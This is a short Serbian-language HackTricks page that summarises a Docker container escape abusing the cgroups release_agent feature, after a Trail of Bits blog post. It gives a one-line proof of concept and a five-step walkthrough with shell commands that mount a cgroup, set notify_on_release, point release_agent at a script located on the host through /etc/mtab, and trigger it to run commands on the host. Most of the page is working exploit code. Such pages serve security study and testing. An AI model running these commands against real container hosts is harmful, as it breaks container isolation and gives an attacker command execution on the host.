# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Za više detalja, pogledajte** [**originalni blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Ovo je samo sažetak:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Dokaz koncepta (PoC) demonstrira metodu za iskorišćavanje cgroups kreiranjem `release_agent` datoteke i pokretanjem njenog poziva za izvršavanje proizvoljnih komandi na hostu kontejnera. Evo pregleda koraka koji su uključeni:

1. **Pripremite Okruženje:**
- Direktorijum `/tmp/cgrp` se kreira da služi kao tačka montiranja za cgroup.
- RDMA cgroup kontroler se montira na ovaj direktorijum. U slučaju odsustva RDMA kontrolera, predlaže se korišćenje `memory` cgroup kontrolera kao alternative.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Postavite Dete Cgroup:**
- Dete cgroup pod imenom "x" se kreira unutar montirane cgroup direktorije.
- Obaveštenja su omogućena za "x" cgroup pisanjem 1 u njegov notify_on_release fajl.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Konfigurišite Release Agent:**
- Putanja kontejnera na hostu se dobija iz /etc/mtab datoteke.
- release_agent datoteka cgrupa se zatim konfiguriše da izvrši skriptu nazvanu /cmd smeštenu na dobijenoj putanji hosta.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Kreirajte i Konfigurišite /cmd Skriptu:**
- /cmd skripta se kreira unutar kontejnera i konfiguriše se da izvršava ps aux, preusmeravajući izlaz u datoteku pod imenom /output u kontejneru. Puni put do /output na hostu je specificiran.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Pokreni Napad:**
- Proces se pokreće unutar "x" child cgroup i odmah se prekida.
- Ovo pokreće `release_agent` (skriptu /cmd), koja izvršava ps aux na hostu i zapisuje izlaz u /output unutar kontejnera.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
